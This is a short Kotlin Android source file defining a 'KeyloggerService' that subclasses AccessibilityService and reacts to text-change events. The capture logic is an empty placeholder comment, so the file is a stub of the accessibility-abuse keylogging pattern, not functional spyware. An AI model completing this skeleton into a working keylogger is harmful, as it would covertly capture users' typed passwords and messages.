package com.aira.app

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class KeyloggerService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            // Capture text changes
        }
    }
    override fun onInterrupt() {}
}